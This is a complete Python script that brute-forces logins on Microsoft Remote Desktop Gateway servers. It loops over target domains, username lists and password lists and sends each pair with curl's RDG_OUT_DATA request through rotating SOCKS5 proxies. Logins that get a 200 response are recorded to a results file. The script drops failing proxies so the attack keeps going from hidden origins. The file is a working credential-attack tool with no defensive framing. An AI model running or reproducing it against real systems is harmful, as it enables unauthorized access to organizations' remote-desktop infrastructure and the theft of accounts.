import asyncio
import logging
import os
import sys
import uuid
from collections import defaultdict
from typing import List

import aiofiles

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO,
    stream=sys.stdout
)

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

RESULT_FILE = "data/result.txt"
BAD_PROXY_FILE = "data/old_proxies.txt"
PROXY_FILE = "data/proxies.txt"
DOMAINS_FILE = "data/domains.txt"
LOGINS_FILE = "data/logins.txt"
PASSWORDS_FILE = "data/passwords.txt"
TEST_FILE = "data/test.txt"
MAX_PROXY_RETRIES = 50

proxy_lock = asyncio.Lock()
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)


async def load_lines(path: str) -> List[str]:
    if not os.path.exists(path):
        return []
    async with aiofiles.open(path, mode='r') as f:
        return [line.strip() for line in await f.readlines() if line.strip()]


async def append_line(path: str, line: str):
    async with aiofiles.open(path, mode='a') as f:
        await f.write(line + '\n')


async def test_file_permissions():
    async with aiofiles.open(TEST_FILE, 'w') as f:
        await f.write('test\n')


async def execute_curl(site_domain, user_domain, login, password, proxy):
    conn_id = str(uuid.uuid4())
    full_user = f"{user_domain}\\{login}"
    url = f"https://{site_domain}/remoteDesktopGateway/"
    curl_cmd = [
        "curl", "--max-time", "30", "--insecure",
        "-D", "-",
        "-X", "RDG_OUT_DATA",
        "-H", f"RDG-Connection-Id: {{{conn_id}}}",
        "-u", f"{full_user}:{password}",
        "--socks5", proxy,
        url
    ]

    try:
        logger.info(f'Execute: {curl_cmd}')
        proc = await asyncio.create_subprocess_exec(
            *curl_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        found_code = None

        async def read_stdout():
            nonlocal found_code
            while True:
                line = await proc.stdout.readline()
                if not line:
                    break
                decoded = line.decode()
                if "HTTP/1.1 200" in decoded or "HTTP/2 200" in decoded:
                    found_code = 200
                    break
                elif "HTTP/1.1 401" in decoded or "HTTP/2 401" in decoded:
                    found_code = 401
                    break

        async def read_stderr():
            while True:
                line = await proc.stderr.readline()
                if not line:
                    break
                decoded = line.decode()
                if "Operation timed out" in decoded or "Connection timed out" in decoded or "(97)" in decoded:
                    nonlocal found_code
                    found_code = "proxy_error"
                    break

        task_stdout = asyncio.create_task(read_stdout())
        task_stderr = asyncio.create_task(read_stderr())

        while found_code is None and proc.returncode is None:
            await asyncio.sleep(0.05)
            if found_code is not None:
                proc.kill()
                break
            if proc.stdout.at_eof() and proc.stderr.at_eof():
                break

        await proc.wait()
        await task_stdout
        await task_stderr

        if found_code == 200:
            logger.info(f"SUCCESS: {site_domain} {full_user}:{password}")
            return 200
        elif found_code == 401:
            logger.info(f"FAIL: {site_domain} {full_user}:{password} Unauthorized")
            return 401
        elif found_code == "proxy_error":
            logger.warning(f"PROXY TIMEOUT: {site_domain} {full_user}:{password} {proxy}")
            return "proxy_error"
        else:
            logger.warning(f"UNKNOWN RESPONSE: {site_domain} {full_user}:{password} {proxy}, treating as 401")
            return 401

    except Exception as e:
        logger.error(f"EXCEPTION: {site_domain} {full_user}:{password} {proxy} — {str(e)}")
        return 401


async def worker(domain_line, logins, passwords):
    site_domain, user_domain = domain_line.split(';')
    total_combinations = len(logins) * len(passwords)
    tried = set()
    active_proxies = set()
    bad_proxy_counter = defaultdict(int)

    async def run_proxy_task(proxy):
        nonlocal tried
        for login in logins:
            for password in passwords:
                if len(tried) >= total_combinations:
                    return

                key = f"{login};{password}"
                if key in tried:
                    continue

                tried.add(key)
                result = await execute_curl(site_domain, user_domain, login, password, proxy)

                if result == "proxy_error":
                    tried.discard(key)
                    bad_proxy_counter[proxy] += 1

                    if bad_proxy_counter[proxy] >= MAX_PROXY_RETRIES:
                        logger.warning(f"BAD PROXY: {proxy} removed after {MAX_PROXY_RETRIES} failures")
                        async with proxy_lock:
                            bad_proxy_list_current = await load_lines(BAD_PROXY_FILE)
                            bad_proxy_list_current = [p for p in bad_proxy_list_current if p != proxy]
                            bad_proxy_list_current.append(proxy)
                            async with aiofiles.open(BAD_PROXY_FILE, 'w') as f:
                                await f.write('\n'.join(bad_proxy_list_current) + '\n')

                            proxy_list_current = await load_lines(PROXY_FILE)
                            proxy_list_current = [p for p in proxy_list_current if p != proxy]
                            async with aiofiles.open(PROXY_FILE, 'w') as f:
                                await f.write('\n'.join(proxy_list_current) + '\n')

                            active_proxies.discard(proxy)
                        return
                    continue
                else:
                    bad_proxy_counter[proxy] = 0
                    if result == 200:
                        await append_line(RESULT_FILE, f"{site_domain};{user_domain};{login};{password}")
                        for p in passwords:
                            tried.add(f"{login};{p}")
                        break

        async with proxy_lock:
            active_proxies.discard(proxy)

    tasks = []
    while len(tried) < total_combinations or any([not task.done() for task in tasks]):
        async with proxy_lock:
            proxy_list = await load_lines(PROXY_FILE)

        available_proxy = None
        if len(tried) < total_combinations:
            for proxy in proxy_list:
                async with proxy_lock:
                    if proxy not in active_proxies:
                        active_proxies.add(proxy)
                        available_proxy = proxy
                        break

        if available_proxy is not None:
            tasks.append(loop.create_task(run_proxy_task(available_proxy)))
            continue

        await asyncio.sleep(0.5)

    logger.info(f"WORKER FINISHED for domain {site_domain}")


async def main():
    await test_file_permissions()
    domains = await load_lines(DOMAINS_FILE)
    logins = await load_lines(LOGINS_FILE)
    passwords = await load_lines(PASSWORDS_FILE)

    logger.info("START WORKERS")

    tasks = [loop.create_task(worker(domain_line, logins, passwords)) for domain_line in domains]
    await asyncio.gather(*tasks)

    logger.info("ALL WORKERS COMPLETED — exiting")


if __name__ == "__main__":
    loop.run_until_complete(main())
